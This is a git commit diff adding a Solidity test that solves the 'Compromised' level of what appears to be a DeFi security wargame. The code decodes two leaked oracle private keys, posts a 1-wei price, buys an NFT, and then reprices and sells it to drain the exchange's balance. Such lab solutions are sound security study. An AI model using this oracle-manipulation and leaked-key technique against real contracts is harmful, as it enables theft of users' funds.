748d5b9098fce12a6563d6c23b4fbc5a847cdc07
ZD Hu <zodahu@gmail.com>
2022-08-08 13:59:24 +0800

    Exploit #7 Compromised

--- test/Levels/compromised/Compromised.t.sol
+++ test/Levels/compromised/Compromised.t.sol
@@ -77,6 +77,54 @@ contract Compromised is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // Obtain private key 1
+        // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+        // -> (base64) MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+        // -> (hex) 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        // -> (uint256) 89771615902902592441115835013957636846484930313261229423143135050517981902249
+        address source1 = vm.addr(
+            89771615902902592441115835013957636846484930313261229423143135050517981902249
+        );
+
+        // Obtain private key 2
+        // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+        // -> (base64) MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+        // -> (hex) 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        // -> (uint256) 14704162073632007086378507696114536121464329293584281490537601610572906937160
+        address source2 = vm.addr(
+            14704162073632007086378507696114536121464329293584281490537601610572906937160
+        );
+
+        string memory symbol = damnValuableNFT.symbol();
+
+        // Set prices to 1 wei
+        vm.prank(source1);
+        trustfulOracle.postPrice(symbol, 1);
+        vm.prank(source2);
+        trustfulOracle.postPrice(symbol, 1);
+
+        // Buy a NFT
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+
+        // Set price to exchange.balance;
+        vm.prank(source1);
+        trustfulOracle.postPrice(symbol, address(exchange).balance);
+        vm.prank(source2);
+        trustfulOracle.postPrice(symbol, address(exchange).balance);
+
+        // Sell the NFT
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        // Restore prices
+        vm.prank(source1);
+        trustfulOracle.postPrice(symbol, INITIAL_NFT_PRICE);
+        vm.prank(source2);
+        trustfulOracle.postPrice(symbol, INITIAL_NFT_PRICE);
+
         /** EXPLOIT END **/
         validation();
     }
